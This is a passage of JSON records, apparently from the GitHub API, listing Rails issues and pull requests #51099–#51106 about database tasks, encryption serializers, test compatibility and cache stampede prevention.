            "avatar_url": "https://avatars.githubusercontent.com/u/58794487?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/dorianmariecom",
            "html_url": "https://github.com/dorianmariecom",
            "followers_url": "https://api.github.com/users/dorianmariecom/followers",
            "following_url": "https://api.github.com/users/dorianmariecom/following{/other_user}",
            "gists_url": "https://api.github.com/users/dorianmariecom/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/dorianmariecom/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/dorianmariecom/subscriptions",
            "organizations_url": "https://api.github.com/users/dorianmariecom/orgs",
            "repos_url": "https://api.github.com/users/dorianmariecom/repos",
            "events_url": "https://api.github.com/users/dorianmariecom/events{/privacy}",
            "received_events_url": "https://api.github.com/users/dorianmariecom/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-02-16T17:16:16Z",
        "updated_at": "2024-02-16T19:16:37Z",
        "closed_at": "2024-02-16T19:16:37Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51106",
            "html_url": "https://github.com/rails/rails/pull/51106",
            "diff_url": "https://github.com/rails/rails/pull/51106.diff",
            "patch_url": "https://github.com/rails/rails/pull/51106.patch",
            "merged_at": null
        },
        "body": "### Motivation / Background\r\n\r\nWhen using asdf the yarn and the node command are not defined if there is no .tool-versions\r\n\r\nThis Pull Request has been created because I had two errors when running rake on railties/\r\n\r\n### Detail\r\n\r\nThis Pull Request adds a .tool-versions file with nodejs and yarn\r\n\r\n### Additional information\r\n\r\nI think asdf is pretty popular and support for it would be nice\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51106/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51106/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51105",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51105/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51105/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51105/events",
        "html_url": "https://github.com/rails/rails/issues/51105",
        "id": 2138937154,
        "node_id": "I_kwDNIULOf32XQg",
        "number": 51105,
        "title": "DatabaseTasks run in both development and test environments when RAILS_ENV=development",
        "user": {
            "login": "deissimon",
            "id": 52425193,
            "node_id": "MDQ6VXNlcjUyNDI1MTkz",
            "avatar_url": "https://avatars.githubusercontent.com/u/52425193?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/deissimon",
            "html_url": "https://github.com/deissimon",
            "followers_url": "https://api.github.com/users/deissimon/followers",
            "following_url": "https://api.github.com/users/deissimon/following{/other_user}",
            "gists_url": "https://api.github.com/users/deissimon/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/deissimon/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/deissimon/subscriptions",
            "organizations_url": "https://api.github.com/users/deissimon/orgs",
            "repos_url": "https://api.github.com/users/deissimon/repos",
            "events_url": "https://api.github.com/users/deissimon/events{/privacy}",
            "received_events_url": "https://api.github.com/users/deissimon/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 3,
        "created_at": "2024-02-16T16:16:50Z",
        "updated_at": "2024-02-16T17:14:59Z",
        "closed_at": "2024-02-16T17:13:41Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "### Steps to reproduce\r\n```ruby\r\n# Commands executed with the expectation of affecting only the development environment:\r\nRAILS_ENV=development rake db:create\r\nRAILS_ENV=development rake db:schema:load\r\nRAILS_ENV=development rake db:drop\r\n# Additional operations like purge, prepare also included.\r\n```\r\n\r\nThe commands above impact both the development and test environments, despite my expectation for them to affect only the development environment. Is this expected?\r\n\r\n### Expected behavior\r\nThe database creation, schema loading, and dropping should be confined to the development environment.\r\n\r\n### Actual behavior\r\nThe database is created, and the schema is loaded, among other actions, in both the development and test environments.\r\n\r\n### System configuration\r\nRails Version: 7.1.3 (issue persists in earlier versions as well)\r\n\r\n**Ruby version**:\r\nRuby Version: 3.2.2",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51105/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51105/timeline",
        "performed_via_github_app": null,
        "state_reason": "not_planned"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51104",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51104/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51104/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51104/events",
        "html_url": "https://github.com/rails/rails/pull/51104",
        "id": 2138886059,
        "node_id": "PR_kwDNIULOZxom3Q",
        "number": 51104,
        "title": "Ignore devcontainer files in docker image",
        "user": {
            "login": "morgoth",
            "id": 10766,
            "node_id": "MDQ6VXNlcjEwNzY2",
            "avatar_url": "https://avatars.githubusercontent.com/u/10766?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/morgoth",
            "html_url": "https://github.com/morgoth",
            "followers_url": "https://api.github.com/users/morgoth/followers",
            "following_url": "https://api.github.com/users/morgoth/following{/other_user}",
            "gists_url": "https://api.github.com/users/morgoth/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/morgoth/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/morgoth/subscriptions",
            "organizations_url": "https://api.github.com/users/morgoth/orgs",
            "repos_url": "https://api.github.com/users/morgoth/repos",
            "events_url": "https://api.github.com/users/morgoth/events{/privacy}",
            "received_events_url": "https://api.github.com/users/morgoth/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-16T15:49:14Z",
        "updated_at": "2024-02-16T19:35:30Z",
        "closed_at": "2024-02-16T17:09:34Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51104",
            "html_url": "https://github.com/rails/rails/pull/51104",
            "diff_url": "https://github.com/rails/rails/pull/51104.diff",
            "patch_url": "https://github.com/rails/rails/pull/51104.patch",
            "merged_at": "2024-02-16T17:09:34Z"
        },
        "body": "Follow up to https://github.com/rails/rails/pull/50914\r\n\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51104/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51104/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51103",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51103/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51103/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51103/events",
        "html_url": "https://github.com/rails/rails/pull/51103",
        "id": 2138744290,
        "node_id": "PR_kwDNIULOZxgzrQ",
        "number": 51103,
        "title": "Fix `db:test:prepare` when using sharding and test primary config is named differently than development primary config",
        "user": {
            "login": "fatkodima",
            "id": 5657035,
            "node_id": "MDQ6VXNlcjU2NTcwMzU=",
            "avatar_url": "https://avatars.githubusercontent.com/u/5657035?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/fatkodima",
            "html_url": "https://github.com/fatkodima",
            "followers_url": "https://api.github.com/users/fatkodima/followers",
            "following_url": "https://api.github.com/users/fatkodima/following{/other_user}",
            "gists_url": "https://api.github.com/users/fatkodima/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/fatkodima/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/fatkodima/subscriptions",
            "organizations_url": "https://api.github.com/users/fatkodima/orgs",
            "repos_url": "https://api.github.com/users/fatkodima/repos",
            "events_url": "https://api.github.com/users/fatkodima/events{/privacy}",
            "received_events_url": "https://api.github.com/users/fatkodima/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            },
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 3,
        "created_at": "2024-02-16T14:33:04Z",
        "updated_at": "2024-02-17T09:54:51Z",
        "closed_at": null,
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51103",
            "html_url": "https://github.com/rails/rails/pull/51103",
            "diff_url": "https://github.com/rails/rails/pull/51103.diff",
            "patch_url": "https://github.com/rails/rails/pull/51103.patch",
            "merged_at": null
        },
        "body": "When using sharding and the `test` primary config is named differently than `development` primary config, like\r\n```yml\r\ndevelopment:\r\n  primary: # can be any name, not necessary 'primary'\r\n    adapter: sqlite3\r\n    database: dev_db\r\n  secondary:\r\n    adapter: sqlite3\r\n    database: secondary_dev_db\r\n    schema_dump: false\r\ntest:\r\n  primary_test: # note the different name\r\n    adapter: sqlite3\r\n    database: test_db\r\n  secondary_test:\r\n    adapter: sqlite3\r\n    database: secondary_test_db\r\n    schema_dump: false\r\n```\r\n\r\n rails is unable to use the default `schema.rb` file when running `rails db:test:prepare`. It generates the following error:\r\n```\r\napp/db/shard_one_test_schema.rb doesn't exist yet. Run `bin/rails db:migrate` to create it, then try again. \r\nIf you do not intend to use a database, you should instead alter app/config/application.rb to limit the \r\nframeworks that will be loaded.\r\n```\r\n\r\nWhen they both are named the same, rails just \"erroneously\" uses the one from the `development` configuration and it succeeds.",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51103/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51103/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51102",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51102/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51102/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51102/events",
        "html_url": "https://github.com/rails/rails/pull/51102",
        "id": 2138552216,
        "node_id": "PR_kwDNIULOZxWXBA",
        "number": 51102,
        "title": "Add MessagePackMessageSerializer for binary data",
        "user": {
            "login": "djmb",
            "id": 1734607,
            "node_id": "MDQ6VXNlcjE3MzQ2MDc=",
            "avatar_url": "https://avatars.githubusercontent.com/u/1734607?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/djmb",
            "html_url": "https://github.com/djmb",
            "followers_url": "https://api.github.com/users/djmb/followers",
            "following_url": "https://api.github.com/users/djmb/following{/other_user}",
            "gists_url": "https://api.github.com/users/djmb/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/djmb/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/djmb/subscriptions",
            "organizations_url": "https://api.github.com/users/djmb/orgs",
            "repos_url": "https://api.github.com/users/djmb/repos",
            "events_url": "https://api.github.com/users/djmb/events{/privacy}",
            "received_events_url": "https://api.github.com/users/djmb/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": {
            "url": "https://api.github.com/repos/rails/rails/milestones/83",
            "html_url": "https://github.com/rails/rails/milestone/83",
            "labels_url": "https://api.github.com/repos/rails/rails/milestones/83/labels",
            "id": 9964242,
            "node_id": "MI_kwDNIULOAJgK0g",
            "number": 83,
            "title": "7.2.0",
            "description": null,
            "creator": {
                "login": "rafaelfranca",
                "id": 47848,
                "node_id": "MDQ6VXNlcjQ3ODQ4",
                "avatar_url": "https://avatars.githubusercontent.com/u/47848?v=4",
                "gravatar_id": "",
                "url": "https://api.github.com/users/rafaelfranca",
                "html_url": "https://github.com/rafaelfranca",
                "followers_url": "https://api.github.com/users/rafaelfranca/followers",
                "following_url": "https://api.github.com/users/rafaelfranca/following{/other_user}",
                "gists_url": "https://api.github.com/users/rafaelfranca/gists{/gist_id}",
                "starred_url": "https://api.github.com/users/rafaelfranca/starred{/owner}{/repo}",
                "subscriptions_url": "https://api.github.com/users/rafaelfranca/subscriptions",
                "organizations_url": "https://api.github.com/users/rafaelfranca/orgs",
                "repos_url": "https://api.github.com/users/rafaelfranca/repos",
                "events_url": "https://api.github.com/users/rafaelfranca/events{/privacy}",
                "received_events_url": "https://api.github.com/users/rafaelfranca/received_events",
                "type": "User",
                "site_admin": false
            },
            "open_issues": 7,
            "closed_issues": 11,
            "state": "open",
            "created_at": "2023-09-25T20:29:14Z",
            "updated_at": "2024-02-20T23:25:19Z",
            "due_on": null,
            "closed_at": null
        },
        "comments": 0,
        "created_at": "2024-02-16T12:43:06Z",
        "updated_at": "2024-02-16T17:07:25Z",
        "closed_at": "2024-02-16T17:07:25Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51102",
            "html_url": "https://github.com/rails/rails/pull/51102",
            "diff_url": "https://github.com/rails/rails/pull/51102.diff",
            "patch_url": "https://github.com/rails/rails/pull/51102.patch",
            "merged_at": "2024-02-16T17:07:25Z"
        },
        "body": "### Motivation / Background\r\n\r\n`ActiveRecord::Encryption::MessageSerializer` creates serialized JSON. The JSON values are Base64 encoded to ensure that the data can stored in text database columns without encoding issues. \r\n\r\nBinary columns however can store arbitrary data, so won't have the encoding issues. By using a MessagePack based serializer we can store data more efficiently without the Base64 overhead (about 33%).\r\n\r\n### Detail\r\n\r\nAdd a new serializer `ActiveRecord::Encryption::MessagePackMessageSerializer` that serializes encrypted data to the MessagePack format, for efficient storage in binary columns.\r\n\r\nTo prevent it being used with text columns, validate that we only try to store binary data in binary columns.\r\n\r\nThe serializer is not autoloaded, because it relies on the optional msgpack gem.\r\n\r\nUsage:\r\n\r\n```ruby\r\nrequire \"activerecord/encryption/message_pack_message_serializer`\r\n\r\nclass Foo < ApplicationRecord\r\n  encrypts :bar, message_serializer: ActiveRecord::Encryption::MessagePackMessageSerializer.new\r\nend\r\n```\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51102/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51102/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51101",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51101/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51101/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51101/events",
        "html_url": "https://github.com/rails/rails/pull/51101",
        "id": 2138150662,
        "node_id": "PR_kwDNIULOZxAJzQ",
        "number": 51101,
        "title": "Update test suite for compatibility with Ruby 3.4-dev",
        "user": {
            "login": "casperisfine",
            "id": 19192189,
            "node_id": "MDQ6VXNlcjE5MTkyMTg5",
            "avatar_url": "https://avatars.githubusercontent.com/u/19192189?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/casperisfine",
            "html_url": "https://github.com/casperisfine",
            "followers_url": "https://api.github.com/users/casperisfine/followers",
            "following_url": "https://api.github.com/users/casperisfine/following{/other_user}",
            "gists_url": "https://api.github.com/users/casperisfine/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/casperisfine/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/casperisfine/subscriptions",
            "organizations_url": "https://api.github.com/users/casperisfine/orgs",
            "repos_url": "https://api.github.com/users/casperisfine/repos",
            "events_url": "https://api.github.com/users/casperisfine/events{/privacy}",
            "received_events_url": "https://api.github.com/users/casperisfine/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107189,
                "node_id": "MDU6TGFiZWwxMDcxODk=",
                "url": "https://api.github.com/repos/rails/rails/labels/actionpack",
                "name": "actionpack",
                "color": "FFF700",
                "default": false,
                "description": null
            },
            {
                "id": 107190,
                "node_id": "MDU6TGFiZWwxMDcxOTA=",
                "url": "https://api.github.com/repos/rails/rails/labels/activemodel",
                "name": "activemodel",
                "color": "00E5FF",
                "default": false,
                "description": null
            },
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            },
            {
                "id": 107194,
                "node_id": "MDU6TGFiZWwxMDcxOTQ=",
                "url": "https://api.github.com/repos/rails/rails/labels/activesupport",
                "name": "activesupport",
                "color": "FC9300",
                "default": false,
                "description": null
            },
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            },
            {
                "id": 3666649,
                "node_id": "MDU6TGFiZWwzNjY2NjQ5",
                "url": "https://api.github.com/repos/rails/rails/labels/actionview",
                "name": "actionview",
                "color": "d7e102",
                "default": false,
                "description": null
            },
            {
                "id": 123812746,
                "node_id": "MDU6TGFiZWwxMjM4MTI3NDY=",
                "url": "https://api.github.com/repos/rails/rails/labels/activejob",
                "name": "activejob",
                "color": "5319e7",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-02-16T08:55:26Z",
        "updated_at": "2024-02-16T11:32:23Z",
        "closed_at": "2024-02-16T11:32:23Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51101",
            "html_url": "https://github.com/rails/rails/pull/51101",
            "diff_url": "https://github.com/rails/rails/pull/51101.diff",
            "patch_url": "https://github.com/rails/rails/pull/51101.patch",
            "merged_at": "2024-02-16T11:32:23Z"
        },
        "body": "https://bugs.ruby-lang.org/issues/19117 and https://bugs.ruby-lang.org/issues/16495 slightly change how backtrace are rendered which makes a few tests fail.\r\n\r\nFYI: @yahonda ",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51101/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51101/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51100",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51100/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51100/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51100/events",
        "html_url": "https://github.com/rails/rails/pull/51100",
        "id": 2137927917,
        "node_id": "PR_kwDNIULOZw0EBg",
        "number": 51100,
        "title": "Encryption: allow turning on `support_unencrypted_data` at a per-attribute level",
        "user": {
            "login": "ghiculescu",
            "id": 509837,
            "node_id": "MDQ6VXNlcjUwOTgzNw==",
            "avatar_url": "https://avatars.githubusercontent.com/u/509837?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/ghiculescu",
            "html_url": "https://github.com/ghiculescu",
            "followers_url": "https://api.github.com/users/ghiculescu/followers",
            "following_url": "https://api.github.com/users/ghiculescu/following{/other_user}",
            "gists_url": "https://api.github.com/users/ghiculescu/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/ghiculescu/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/ghiculescu/subscriptions",
            "organizations_url": "https://api.github.com/users/ghiculescu/orgs",
            "repos_url": "https://api.github.com/users/ghiculescu/repos",
            "events_url": "https://api.github.com/users/ghiculescu/events{/privacy}",
            "received_events_url": "https://api.github.com/users/ghiculescu/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-16T05:58:33Z",
        "updated_at": "2024-02-16T05:59:34Z",
        "closed_at": null,
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51100",
            "html_url": "https://github.com/rails/rails/pull/51100",
            "diff_url": "https://github.com/rails/rails/pull/51100.diff",
            "patch_url": "https://github.com/rails/rails/pull/51100.patch",
            "merged_at": null
        },
        "body": "https://github.com/rails/rails/pull/49072 allowed you to turn `support_unencrypted_data` on a global level, then turn it off for specific attributes. But it didn't allow the inverse: you couldn't turn the config off globally, and then turn it on for a specific attribute.\r\n\r\nThis PR adds support for that, which should make the setting's behaviour less surprising.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51100/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51100/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51099",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51099/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51099/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51099/events",
        "html_url": "https://github.com/rails/rails/pull/51099",
        "id": 2137884802,
        "node_id": "PR_kwDNIULOZwxuCg",
        "number": 51099,
        "title": "Add a new option `early_expiration` to `ActiveSupport::Cache::Store#fetch` to avoid dog pile effect",
        "user": {
            "login": "tonytonyjan",
            "id": 809410,
            "node_id": "MDQ6VXNlcjgwOTQxMA==",
            "avatar_url": "https://avatars.githubusercontent.com/u/809410?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/tonytonyjan",
            "html_url": "https://github.com/tonytonyjan",
            "followers_url": "https://api.github.com/users/tonytonyjan/followers",
            "following_url": "https://api.github.com/users/tonytonyjan/following{/other_user}",
            "gists_url": "https://api.github.com/users/tonytonyjan/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/tonytonyjan/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/tonytonyjan/subscriptions",
            "organizations_url": "https://api.github.com/users/tonytonyjan/orgs",
            "repos_url": "https://api.github.com/users/tonytonyjan/repos",
            "events_url": "https://api.github.com/users/tonytonyjan/events{/privacy}",
            "received_events_url": "https://api.github.com/users/tonytonyjan/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107194,
                "node_id": "MDU6TGFiZWwxMDcxOTQ=",
                "url": "https://api.github.com/repos/rails/rails/labels/activesupport",
                "name": "activesupport",
                "color": "FC9300",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2024-02-16T05:09:34Z",
        "updated_at": "2024-02-17T12:13:37Z",
        "closed_at": null,
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51099",
            "html_url": "https://github.com/rails/rails/pull/51099",
            "diff_url": "https://github.com/rails/rails/pull/51099.diff",
            "patch_url": "https://github.com/rails/rails/pull/51099.patch",
            "merged_at": null
        },
        "body": "### Motivation / Background\r\n\r\nI encountered an issue that `:race_condition_ttl` can still suffer from dog pile effect in the use case of high intense services because during the period of extending expiration time, other process can still access the same entry and try to regenerate the cache at the same time.\r\n\r\nWhile searching for solutions, I realized probabilistic early expiration approach might be a simpler and more efficient solution. It is a technique to avoid the dog pile effect (aka cache stampede) by expiring the cache before the TTL.\r\n\r\nI implemented this method based on the paper[^1] which uses probabilistic decision with the exponential function `Exp()` and demonstrates to be optimal.\r\n\r\n[^1]: [Vattani, A.; Chierichetti, F.; Lowenstein, K. (2015), Optimal Probabilistic Cache Stampede Prevention, Proceedings of the VLDB Endowment, VLDB](https://cseweb.ucsd.edu/~avattani/papers/cache_stampede.pdf)\r\n\r\n### Detail\r\n\r\n1. Add new option `early_expiration` to `ActiveSupport::Cache::Store#fetch`.\r\n2. Add new method `ActiveSupport::Cache::Entry#should_expire_early?(beta: 1)`.\r\n4. Add new instance variable `@generation_time` to `ActiveSupport::Cache::Entry`.\r\n\r\nHere is a simple implementation to illustrate the approach:\r\n\r\n```ruby\r\ndef x_fetch(key, ttl, beta = 1)\r\n  value, delta, expiry = read(key)\r\n  if value.nil? || Time.now  delta * beta * Math.log(rand)  expiry\r\n    start = Time.now\r\n    value = yield\r\n    delta = Time.now  start\r\n    write(key, value, delta, ttl)\r\n  end\r\n  return value\r\nend\r\n```\r\n\r\n### Additional information\r\n\r\nI created a stacked histogram comparing the stampede sizes between `:race_condition_ttl` (fetch) and `:early_expiration` (x_fetch):\r\n\r\n![800k_histogram](https://github.com/rails/rails/assets/809410/01dc5a69-4206-458e-ad76-c52637f9f00b)\r\n\r\nAs the histogram shows, `:early_expiration` has smaller stampede size compared to `:race_condition_ttl`.\r\n\r\nFor the definition of \"the stampede sizes\", please refer to [the paper](https://cseweb.ucsd.edu/~avattani/papers/cache_stampede.pdf).\r\n\r\nNote that the benchmark is generated using 16 threads. The difference could be more significant with higher number of threads.\r\n\r\nFor more information, please refer to the [benchmark repository](https://github.com/tonytonyjan/rails_cache_stampede_benchmark).\r\n\r\nThe benchmark repository: https://github.com/tonytonyjan/rails_cache_stampede_benchmark\r\nThe paper: https://cseweb.ucsd.edu/~avattani/papers/cache_stampede.pdf\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51099/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51099/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
